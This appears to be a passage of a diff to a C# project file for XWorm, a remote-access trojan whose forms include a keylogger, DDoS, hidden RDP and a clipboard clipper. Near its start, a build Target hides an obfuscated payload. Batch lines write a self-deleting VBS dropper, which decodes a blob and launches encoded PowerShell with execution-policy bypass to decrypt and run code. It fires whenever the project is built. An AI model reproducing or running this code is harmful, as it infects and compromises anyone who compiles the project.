o3Dn8KmwpHDnsOvwqPDhcKqwpfDjMOswpvDoMONwqPDo8K7w5PDp8OBw5vDmsOow5DCv8Okw4vDi8OnwrbDosODwqvDjMOow4PDjsKpwrXCscKmwpPDrcOcw4bDk8OAwqnDgsONwqXCsMK6w5HCr8OOw4bDgsOuw4fDhcOHwqbDicKgw4zDgcK4wpnDq8Oow5LDjsK/wqPDksOqwpHDgcK6wqnDoMK9w5zDjcKpw5zDg8ONwpLDn8Ogw4PDnMOOwrnCrMOuwqjDhMOPw5vDn8OZwpvDssOZwprDpMODwq3DicOJwrTDk8KlwpPCr8KuwqnCrsOIwrHDs8OrwqPCscOFwrjDmsKswpXDrMOdwo3DnMOGwqTDm8Knw4XDgcK5w4fDrsKqwo3DjsOuwrbDp8Ohw4XDrcOKwrrDmsK8w5HCq8OpwqzDj8OGwpTDrsOrwpbDk8OKw5jDssOWwqrCqsOJwrzCrcOJwpjDgsOswq3Dm8OvwpnDp8OLwqrDscOJwrPCrMKow4jDkMKnw47Dn8OCw5XDq8K7w43DssOCwqfDksOiw5TDkMOOwrzDncONw5fDisKlw4zDjMKtw4/CrcOuwrbCusK/w43DncOGw5zCvcKpwrnDicKgwq/Dn8OpwpTDrMOtwrrDssOFw4PDosOWwqbDpsOYwpbCrcOdwqbDr8Ksw5HCrcOsw43CrcKgwqXCrMOcwrbDh8KgwrzDs8Ksw5fCqMK5w5vDhcKrwpTCvMOswqzCqcOAwrPDp8Kgwq3DrcOWwpfDqMKsw5LDr8Oow5TDg8Kmw5nDpMKtwpLDjcKkwpPCvMOiw5DDg8KrwpTDgsK5wpbDi8ObwrjDk8Onw5XDiMOlwrTDicOmw5fCv8OGwq/Dp8Klwo3DmsOJw4vDi8K+w5vCq8OFwpHCvsOLwqjDs8OHwpHDr8ODw5DDocOdw5XDicK2w5jDi8OJw5fDssOLwqPDnMK8wpbDrsKrwo3DnsK5wrnDkcOmw4rDkMOHw43DnMOXw5rDnsOCwrvDhMOMwrPDrcOAwrnDg8Ocw5jDpsOBwrfCqcOlw43CqMOmwrnDqcOvw4vDn8KlwrDDp8OewrvDp8KrwpXDi8KqwpPDrsKsw5PDscOJwrjDncOKw4bCpMKkw5DDmsOswqjDi8OWwpjDocKmw5vDkcOuw4rDoMOvwqrCvMOjwqTDhcOnwo3Cr8KgwqjDqsOcwpPDsMOlw4XDk8K8w4fDmsOfwq3DnsKmw5bDksOAw5PDsMOew4zDj8Kow4PDoMOvw4nDjMOawqfCrMObwqbDm8KowrLDgMOPwq7DpcOHw5LDqsKlw5PDo8Ofw5LDrcOZw4TDsMK7wrPDk8OLw5XCqcOrw4fDpcK9wpfDpMKlwo3DncKow5fDh8Ksw5XCu8Ogw43DncK2w5LDp8OMwq7Di8OhwrPCrMOrwrXDi8Klw5nDicK3w4XCv8K8wrvCsMK/w5vDpsOjw5TCu8OuwrDDnMK7wq7DsMOfw4jDicKlw4rCqcOjwrDDrcKmwpjDjcK4wqPDssOWw5rCqcOGw4jCqMOdw4fCrMKtw5vDnMOLwrfDq8OdwrHDs8K2wpPDgMOcwpTDhMKgw4jDnMOjw47DhcOCwqXCssOWwpnDm8OhwpHDqcOcwpvCqsOcwqjCssKrw5DCrsOow4XDiMKqw5HDmsOjw4PDksOFw4PDpMOYwrPDm8ONw4bDscKuw5jDocOWwrbCvsK6wpHCqMOHw5DCvMKlw5vDo8Ksw4jDncKgwrjCssOWw5nDm8Ogw5PDr8OmwqnCusOowqrDssOZw4PDs8Kgw5jCrcKmwpvDnsKgwqbDscKnwpfDg8Kpw4nDssK/wpLDkMOFwprCvMOZwqPCvsOswo3DpcOAwqzDkcONwpvCq8Odw4jDg8Krw5LDp8OCwrLDgMOswo3DhMK7wpPDnMOlwpTDhMOqwprCm8KwwobDrcOiwoLCtsKVwobDnsK3wpDDjcOkwqXDocOWw5TCusOnw5TDmsOuworCosKwwr3DmsOnw5TDmsOuwr/Cs8KvwrTDnsOrw4fDq8Oow4fCocKZw5bDpsKewp3CncOHwoLCtsKVwqbCmcKiw4fCu8OPwoLCncOpw4/CmcKiw4fDp8OYwoLCm8KXwp3CncOpwoLCtsKVwobDi8KjwrbDqMK4w4rDmsOnwqPDq8Onw4PDssKdwovCtMKVwr3DmsOnw5TDmsOuwr/Cs8KvwrTDnsOrw4fDq8Oow4fCocKZw5bCosKwwoLCncK3wrjDj8KVwp/CmcOQwrXDssOow5bDnsOiwpDDjcOaw5rDrcKjwqfDp8OYw5HDncOew5DDoMOSwpzCs8OKwrbCv8KtwpDDgMOaw5bDjMOpw5TDosOjw4nCocOQwrXDssOow5bDnsOiwpDCvMOkw5DDr8Oaw5TDrcOSwpzCs8K7w5TDqMOiwqTDmsOow4fCr8KpwrXDrcOnw4vDp8OcworCpsOfw5HDosOjwoLCncOpwovCosKwwoLCncK6wrLDkcKVwp/CmcKXwqvDp8Orw5HDpMOawo/CvsOtw5LDq8Oaw5XDrMOew5HDp8KXwp3CmcODw4fDsMKiwqPDpcOew4PDrMKVwo/Dh8OWw4/DnsKVw5LDkMODwoLCpsOLw4PDpcOqw4fCmcKZwqfDicONwoLCpsK7w5HDq8OYw4fCtMKVw5LDkMODwoLCncK3wrjDjw==&quot; &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo d = &quot;PCrMK/wqXCqsOuw43CqsOgwq7DoMOAwpnCsMOCwprCvMKkw4rDgMOhwprCssK3wo3DksKuwq3DqcKgw4/DrcOkw4nDs8OFwpTDr8ObwrvDq8OCwqjDhsOfw4rCscOKwqzDocK5w5TDnsOZwqPDh8Otw4jDjMOcwq3DgcOrwq3Dj8K8w4fCusK/wrXCrsOXw5TCrMOfw4bCvcOcw5PDrMOAw4nCssOkwrbCvsOiwpLDocKuw4PDqcOtwpbDh8OAwrDCv8OLwprDh8OewqPDhcOmwqPCqMOvwqTCr8K3w5zDrsKowq3CqsOYw5vCu8OpwqjDnsOqwqvDn8OXw4nDq8Krw5fDpMOvw4fCu8Ksw4bCv8OZwqnDiMOjwpTCv8OpwqzDncOGw5TDnsOow4vDgsOjwqrDgsOCw4fDrsOlw4zDrsOPw4bCsMK2w5TCqcOFw5vDosOFwqTDk8Kgw5jDicKowq3CsMOYw4nCv8ODw5fDn8Obw4jCrcKowrDCvsKtw5TDnMOuwrLCpMOOwprDqcOvwqjDm8Ovw5nCpMK3wpnDqMOrw5XCu8Onwo3CvcOew4rDgsKuw5LDgsONw4nDscK/wq7DmsOkwpHDkMObwprDm8Kmw4jCqcOKwqfDpMOjwqfDgMOgwrDDo8OcwpHDksOPwprCvcONwrrDs8Olw5LDmsObw5DDj8Klw5TDssOowpPDosOGwrfCrcOCwpvDo8OIwqTDncKowrHDpsKuw5XDmsKtw5jDn8KuwqjCr8OcwrPDj8OuwrLCsMOZw5DDosOIwrPDhcOuw4XDhMOrwqXDnMK4wo3CsMOJw4bDpcK9wqrDg8OKwpTDicOvwrHDr8OdwrDDocOOwrjCscK6wqrDqcK3wpbDs8K5wqnCsMOCwrTDgsKqwpLDrcOvw5nCvMOWwrHDhsObwrLDqcOow5zDqMOJwrbDp8OEwpLCvMKkwpnCqMOsw5XDjcOcwqvDpMOvw5TCpMOpwprCqMKgwqbDpsOqw4zCusOlw4bCqsKgw5HCvMOIw5rCu8OqwrbCqcOtwpLDosOvw5nDrMOowpnCq8Ohw43DpMObw4vCscOMwrLDncKowqfCv8Kqw5LDpsOdwrTDqMOZwrDDhMOIw47DicKkwqPDosOuwq3Dq8KlwpHDp8Kqw5LDicOpwo3CvMObwq7Dh8OYw5HDn8K4w5bCq8OiwqjCqcOIwpbDjcOKwpLDi8Oqw5XDpMK7wrfDocOXwpbCvcOrwo3DrsOZwpvDgsOawrHDnsK+w5LDg8KqwpjDqsKsw4rDhsOZwprDosOuwqPDiMOhw4TDpcK8w4vDsMK2w5fDk8Opw5LCrcKtw5bCrsOtwqrDiMOiw5HDh8Kow4TDjcK8w5HDiMODwq/DssK8w5XDnsOpwpjDkMK4wpvCrsOHwrbDpMOEw4jCssK9wqbCvMOvwpnDgMOZwqXCrcOHw5rDssOIwq7CqsOtwqnCqMOIw5HDpcOKw5HDiMKpwq/DocOKwrfDqcOOwqPDicODw5bCrMOuw4/DgsOJwpLDg8OYwpXDosKlw5bDqcOKwrbCqcOEw5TCr8OJwrrDk8OowqTDi8OKwrHDjcK/wqzDrsK+w5PDrMKrwpLDo8OfwqjDi8K/w5HCrMK9w4TDncKnw5rDjMOvwrvDo8OFw4PDsMOmw4XDjcKuwqjDo8ObwrHDiMObwrPDr8OEwrfCusOCwpPDq8K/wrLDh8Oew5zDisOuwpvCsMOKwqbDq8OYwrLDscOowqjDp8OWwo3DnsOuw4bCusKkwrjDqMONw5DCrcOEw5fCpMOOw5nDsMOowpvDrcOlwrDDn8OGwqvCvsOJw4TDncOFw4PCqMOuw5LDssOpw4TDqsOPwqvDo8OLw5XDoMK+w4nDicOGwpPDpsObw5fDq8OIw4TDjcKmw4rDpMK+w5zDkcOowpXCvcK8w4bDpcKnwqjDi8Opwq3Dm8K9w4TCrsOrw4vDr8OgwrfCssKtw5zCpMOfw4nDgMKmw5XDmsOAwrrDhMOiw5HDpcOEwq7DncOXwqfDp8OXwpXDhMOpw5TDssOawpTCqsOow4zDr8OEw5fCscKrw5vDm8KuwqfDk8OHwrHDicOiwrPDosObwqTCssOnw4nDm8Kow5HDpMONwrrDr8OEwpvDncKtw5PDkcOFwqrDkMOmwrLDrMOFwpfCpMK7wrrDmsK/w5XCvcK7w5fDi8K+wqTDocOsw5HDp8OCw47DqsOuwq/DiMODwpvDq8Kkw4vDj8OAw4jCvMOGwrzDgcOFwqXDhMOOw5DDhMOMw4zDnMOlwpPDkMK8wrzDhMOWw5rDqMOPwqvDpsOhwqfDicOGwqvDrsOdw4vDjsOnwpHDg8OKw5bCvcOPwqrDrMOXwrzCsMOdwpHCqsOswqTDnsK3wrHCv8Kkwq7DkMOAwrbCpMOmw4nDrcK4wpjCrcK/w4PDjMOkwq/DgsK4wrfDsMOOwqbDrMK+wrfCscK7w4rDscKlwpvDq8OtwpfDscOiw4bDhMKtwpvDgMOdw5zDqsOCwpLDgMOtwrbDssOaw5jDpMOuwrvCq8KnwrPDk8K+wqXDr8OvwqzDicK/wpXDsMODwqfDo8Kpw5TDmsOawqXDscKlw5vDi8Oow5zDksOIwqjDrsONwrjCvsK2w5rDi8K+w4jDksK/w43DpMOnw5bCv8OcwrjDn8K/wqTDgMONw5bDh8K2wpjDgcKow5vDkMKmwpXCqsOqwrXCscOIw43DgcK/wq/DqcK8wpPDgsOHw4TDq8OqwqTDgsOcw4rDs8Ojwo3DmsKnwqzDi8Kkw5zDk8K+w5HDocONw4XDsMONwpbDqcOAwrzDjsK7w4XCpMOEw47DssOewpbDj8Ojw43DrsOuw4jCr8K6w5rDoMOWwrvDqcKuw4XCr8K4w5vCvsOMwo3Dp8Okw4nCu8OJw4/CqcOAwrnDm8OJwqPDr8Olw5rDpcK6w5XCscOmw5XDpMOlwpjCu8OowqPDm8Ofw4zDp8OEwpPDosOYwpHCusOKwq7CqcKkwo3CusOtwpHDkMOcw5DCssOrw5TDgMOPwpjCv8OawqfDnMK6wqPCv8OFwpXCrMOAwpHDpsOowpXDhMOKwrHCsMKgwpPDrsOXwrvDq8Knw4jDiMKnw4nCscOOw47CqcOdw5fDgsOLwqPDosOAw4jCrcObwqXCscOGwqvDisOJwpvCscK6w5jDpsOWwq/DksK2wqrDicOcwrvCpMOOwqvDsMKpw5LDm8OpwpTDncOlw4nDhsKuw4XCvcOawrHCu8KnwrLCqcONwrvCvMOnwrDDgsOmwqfDnMKuw5rDjcOWw5LDssOqwq3CvsKlw4XDicKqwrrDjsK4w4PDk8K3wqXDrsODw4PDgsK8w5TDocOEwrPDn8Orw47DpsOowrfDhMOuw4TCvsOjw4vCqsOAw4vDrMKswqbCvcKgwrnDgMOOwq7DkMOhwrnDqMOcwrzCvMOLwrnDrsOvwrjDp8K7w5PDh8OCw5DCqsOcwpXDoMKtwqjDo8OOwpnDksKqwprCsMOawrfDssK3wqjDiMKtwrTDjcOIw5rDmsOiwpXDocOdwprCvMOBw5fDrMONwqfDsMOqwpfCv8ObwpvDisOHwrjCusOPwpfCrsOqwq3Dr8OowrnDncOrwrLDrMOlwpLDgMOlw5PDhMK/wpvDgcOpwqfDocOFw4/DrcOGw4fDkMKnwpjDgMOlwq7DmsOBw5rDrMOCwrXDnMOGwq/DgcOpwpHDksOhwrzDnMOjwpjDpcOKw4zDjcK2wqbDg8OcwqvCssK3w4/Dj8OjwprDpcOPwrvCv8OMw4bDhMOqwpLDmsOnw5zDpsKow4XDpMOow5LCqMOCw5rDsMOlwpTDpMOZw5vDpsOewqXCvsOfwpbDqsOMw5bDg8Ovw5PDkMOIwrvDs8OIw5nDoMKlw5XCvcOJwpLDrsK+wrzCvcOBw4bDp8OLw4jDqMOIw5rDgsK/w5zDpcOBw5vDiMK5w5vDosOswqXCsMK9wrfDg8KqwrbDrMOHw5bDh8OuwrvDhMOBw5rCscK2w43DscOvwqvDp8OHw4rDjMOuw5DCu8Ohw4vDgsOHwqPDocKuwpnDg8Oaw4rDk8Olw5zDscOIwpjCqMK6wqbCusOIwrnDk8KmwqXCusK8wq3Cu8OBwrDDrcK/w4/Cq8OrwrfDkcOLwqnDh8ODw4rDssOIwqvDjMONw5HDjMOiwrTDg8OmwpbDkMK7w5bDscK4wqTCpMKkw4jDn8OHwq3CqcOJwq/DssObw5XDpMKpwpPDpsOYw5zDnsK2wpfDiMOowrHDrcOfw5DCvsKuw4vDg8K4wq7Cv8OJw4rDssK4w4PDi8Olw47DrsK/wpjDpsK2w5HDkMKrwrDDm8OrwqPDh8Klw5fDq8OLwqrDrMKlwrrDj8OqwpTCqsOMwpbDnsOuw5PDg8OfwqrDr8ONwrvDisK+wqvDqcOfwpfDqMOhwprDkcOewqnDpMOswrzDiMOew4nDocOewpXDncOrwrjDrMOXw4/DrcOjwqnCu8Kqw4bDhMK8wrPCqcOIw4TCrMOhwqvDqMK4wpbDjMK2w4XDqMKtw4fDnsKow4fDpcK9wqvDnMK5wqjDm8OJw5DCsMOrwq7DrMOHw47DscOAw47CqsKsw4/DqMKqwqvDicOmwpLDgcONwqnDg8Odw5rDn8OIwqPCusOXwqnDo8OYwqjDiMKpw4PDqMK8w4TDjsOawrXDocKmwrzDkMOMwpLDpsOnw4zDs8OMwrXDr8K6w5TDj8Knwo3DrsOLw5XDn8OKwpfDg8K8wpjDrMOKwqjDqcOew4XCvsK/w43CssOsw4XDpsKgwpLCv8OCwpfDgcOLwprDs8Kqw4XCrcK+wrDDgcOmwqTDm8OqwrfDr8KswqTCscOew5XCscOWw5bCu8OhwrfDicOYwq/DocK7w5PDqMOWwrPCvsOdwqPDgsKkwrrDpsONw5nDr8OWwrPDhsOCw4fDhcOKwrjCq8K2w5LCqsOewq3DhsOjwqbDqcOewpTCu8K+wq/Dm8Kuw4XDpMOZw5PDi8Okw4nCqsK5w4XDrMOMw5nDhsOuw47CqcOhw4XDm8K5wqjCqsKlw5XCrsK6wrzDgMOEwpXDqsOmw5vDpMKpw4vDjcOKwqTDiMK6w4XCvMOswqPDoMOBwrTDpMOvwq7DqcOOwrzDpcOiw5fDgcOnwrjDj8KmwrjDkcOhw4fDssOfw4fCrcOWwqzDn8Oew4bCssK8wrDDisK3w5LDicOkw5fCvcOrw5fDqcK5w43DqMKkw43Dn8K/wqzDosKowq3DqsK2wpTDq8ODwrfDgcKqw5fDjMKpwq7DgsOIwrjDh8Knw5jCpMK4wq/Dn8OOwqzDq8OOwpXCvsOiw5LDssOnw5nDn8ObwpHCrMOHwprCsMOBw4zDiMOOw43DosKtwpbDpsOJwqvCrMOfw43Ds8K7w4PDj8K9wprDicK7wqXCqcOEwrHDgMKrw5fDocOcwrbDq8OkwpTDoMK+w4PCrsOfw5LCusOdwqjDpMOCwq7CrcK6wqbCusOKwqnDo8OFwqnCqMOYw4jDrcOpw4nDh8K+wpHDgcKtw5PCusOjwq7DmsOjw5vCvcKow5LDjMOAwqnDrcK9wpHDosK9wpjCqMOHwq/Do8OAw5nCpMOPwrTDgcOjw4fDk8Onw43DjMK9wpfCq8ONwprCqMOlw5TCr8OWw4rDocOewqTDrcOHwpXDkcK4wq3CssKkwrDDo8K2wpnDn8ODwrfDo8OXwrvDrsOLwq/DncOmwqXDrsK8wrPDoMK7w5vCr8OvwpXCq8OKwrHDg8K3wqjDm8OiwrfDg8K/w5XDgcK9wqzDqcOrw5TDo8OYwpjDqcOmwq3CqMKlw4zDqMOqw5PDgsODwq/CvcOLwpvDisK/wqTCqsK6wpPDksKqwo3DnMOFw4XDjMKlw4nCvcKpw5DCqcKgwqbDoMOvwqPDg8KpwprCsMOCwrbDpcOFw5PDssOsw4fCpMKlw43Do8OOwrrCusOuwpHDo8OCwqfDssOMwpvDs8OOw4rCqMOEw4/CsMOYwpbDscK9wrDD&quot; &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\33Yd.dart&quot; &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo k.Write e &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell -ep bypass -enc JABkAGkAcgA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGEAdABoAF0AOgA6AEcAZQB0AFQAZQBtAHAAUABhAHQAaAAoACkAKwAiAFwATAAyAHgAMwBkAGMAIgA7ACQAZgA9AGcAYwBpACAAJABkAGkAcgAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBkAGEAcgB0ACIAOwBmAG8AcgBlAGEAYwBoACgAJABmADIAIABpAG4AIAAkAGYAKQB7AHQAcgB5AHsAJABiAGIAZAA9AGcAYwAgACQAZgAyAC4ARgB1AGwAbABOAGEAbQBlACAALQBSAGEAdwA7ACQAZAA9AHsAcABhAHIAYQBtACgAJABwAD0AJABiAGIAZAAsACQAbAA9ACIAYgB5AHUAIgApACQAdAA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAHAAKQApADsALQBqAG8AaQBuACgAMAAuAC4AKAAkAHQALgBMAGUAbgBnAHQAaAAtADEAKQB8ACUAewBbAGMAaABhAHIAXQAoAFsAaQBuAHQAXQBbAGMAaABhAHIAXQAkAHQAWwAkAF8AXQAtAFsAaQBuAHQAXQBbAGMAaABhAHIAXQAkAGwAWwAkAF8AJQAkAGwALgBMAGUAbgBnAHQAaABdACkAfQApAH0AOwAkAGsAPQAmACQAZAA7AGkAZQB4ACAAJABrADsAYgByAGUAYQBrAH0AYwBhAHQAYwBoAHsAfQB9AA==&quot;, 0, False &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo Set shell = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo s = WScript.ScriptFullName &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo f.DeleteFile(s) &gt;&gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;endlocal" /></Target>
+  <ItemGroup>
+    <EmbeddedResource Update="XWorm.Abouts.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Abouts.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.VoiceChat.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.VoiceChat.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.About.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.About.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ACT.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Builder.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Builder.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Chat.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Chat.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Clipboard.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Clipboard.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Clipper.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Clipper.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.CustomOpen.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.CustomOpen.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.DDosAttack.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.DDosAttack.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.EditReg.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.EditReg.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.FilesSearcher.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.FilesSearcher.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.FM.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Form2.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Form2.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Ftp.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Fun.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.HApps.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.HApps.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Hash.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Hash.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.HBrowser.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.HBrowser.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Hosts.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Hosts.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.HRDP.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.HRDP.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.INFO.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.INFO.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Keylogger.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Keylogger.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Main.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Main.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Maps.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Maps.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.MBox.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.MBox.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.MIC.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ngrok.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.ngrok.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Performance.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Performance.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Port.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Port.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ProcessV.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.ProcessV.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
